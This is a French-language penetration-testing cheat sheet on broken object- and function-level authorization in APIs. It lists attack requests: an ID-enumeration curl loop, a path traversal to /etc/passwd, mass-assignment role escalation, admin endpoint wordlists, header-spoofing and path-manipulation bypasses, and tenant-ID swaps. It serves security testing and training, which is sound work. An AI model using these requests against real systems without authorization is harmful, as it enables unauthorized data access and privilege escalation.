# BFLA / BOLA - Broken Authorization

*IDOR, function-level access control, et horizontal/vertical privesc*

## TL;DR

- **BOLA** (Broken Object Level Authorization) = IDOR = accéder aux objets d'autres users
- **BFLA** (Broken Function Level Authorization) = accéder à des fonctions non autorisées (admin endpoints)

## BOLA / IDOR

### Patterns de Base
```http
# ID séquentiel
GET /api/users/123/profile
GET /api/users/124/profile  ← Autre user

# UUID (deviner ou leak)
GET /api/orders/550e8400-e29b-41d4-a716-446655440000

# Path parameter
GET /api/documents/report_2024.pdf
GET /api/documents/../../../etc/passwd

# Query parameter
GET /api/search?user_id=123
GET /api/search?user_id=124
```

### ID Enumeration
```bash
# Séquentiel
for i in {1..1000}; do
  curl -s "https://api.target.com/users/$i" -H "Auth: token" | grep -q "email" && echo "Found: $i"
done

# UUID harvesting
# - Chercher dans responses JSON
# - Logs, error messages
# - URL dans emails
# - WebSocket messages
```

### GraphQL BOLA
```graphql
# Alias testing
query {
  own: order(id: "MY_ORDER") { id total status }
  other: order(id: "OTHER_ORDER") { id total status }
}

# Si "other" retourne des données → BOLA
```

## BFLA

### Admin Endpoints
```http
# Endpoints non-linkés mais existants
GET /api/admin/users
POST /api/admin/config
DELETE /api/admin/cache

# Version/prefix variation
GET /api/v1/users        ← Normal
GET /api/internal/users  ← Admin?
GET /admin-api/users     ← Admin?
GET /api/v2/admin/users  ← Hidden admin?
```

### Method Switching
```http
# L'authz peut varier par méthode
GET /api/users/123     ← Autorisé (lecture)
PUT /api/users/123     ← Pas vérifié (écriture)
DELETE /api/users/123  ← Pas vérifié (suppression)
```

### Role Parameter Injection
```http
# Élever ses privilèges via mass assignment
PUT /api/users/me
{"name": "Test", "role": "admin"}

# Ou dans la création
POST /api/users
{"email": "new@test.com", "isAdmin": true}
```

## Techniques de Découverte

### Wordlist Admin Endpoints
```
/admin
/api/admin
/api/v1/admin
/internal
/api/internal
/management
/api/management
/swagger
/api-docs
/graphql (introspection)
/actuator
/debug
/config
/_internal
```

### Differential Testing
```bash
# Comparer user normal vs admin
# 1. Capturer toutes les requêtes en tant qu'admin
# 2. Rejouer avec token user normal
# 3. Chercher les 200 au lieu de 403

# Avec Burp Autorize ou AuthMatrix
```

### Parameter Mining
```http
# Headers custom
X-Admin: true
X-Role: admin
X-User-Role: administrator
X-Override: true

# Query params
?admin=true
?debug=true
?role=admin
?internal=true
```

## Bypass Techniques

### Path Manipulation
```
/admin/users          → 403
/ADMIN/users          → 200?
/admin/./users        → 200?
/admin/users/         → 200?
/admin/users;.js      → 200?
/%61dmin/users        → 200?
/admin/users%00       → 200?
```

### Proxy/CDN Bypass
```http
# Headers pour bypass
X-Original-URL: /admin/users
X-Rewrite-URL: /admin/users
X-Custom-IP-Authorization: 127.0.0.1
X-Forwarded-For: 127.0.0.1
```

### HTTP Method Override
```http
POST /admin/users HTTP/1.1
X-HTTP-Method-Override: DELETE

# Ou via query
POST /admin/users?_method=DELETE
```

## Multi-Tenancy

### Tenant Isolation
```http
# Accéder aux données d'un autre tenant
GET /api/tenant/TENANT_A/data  ← Mon tenant
GET /api/tenant/TENANT_B/data  ← Autre tenant

# Ou via header
X-Tenant-ID: other-tenant
```

### Org ID Manipulation
```http
GET /api/orgs/123/users
GET /api/orgs/456/users  ← Autre org

# Dans le body
POST /api/users
{"name": "Test", "org_id": "456"}
```

## Validation

```markdown
## BOLA/IDOR
1. Accéder à l'objet en tant que owner légitime
2. Changer l'ID pour un autre user
3. Montrer les données de l'autre user dans la response
4. Prouver que c'est un autre user (ID, email différent)

## BFLA
1. Identifier l'endpoint admin/privilegié
2. Appeler avec token user normal
3. Montrer que l'action s'exécute (200, données retournées)
4. Prouver que le user ne devrait pas avoir accès
```

## Pro Tips

1. **Tester CHAQUE ID** — Users, orders, files, comments, tout
2. **GraphQL aliases** — Test parallèle owned vs foreign
3. **Method switching** — GET ok, PUT/DELETE pas vérifié
4. **UUID ≠ sécurisé** — Ils leakent (logs, URLs, responses)
5. **Mass assignment** — role, isAdmin, org_id dans les updates
6. **Differential testing** — Autorize plugin pour automation

## Labs

- PortSwigger: Access control vulnerabilities
- OWASP API Security: API1 (BOLA), API5 (BFLA)

## Références

- Strix Skills: broken_function_level_authorization.md, idor.md
- OWASP API Security Top 10
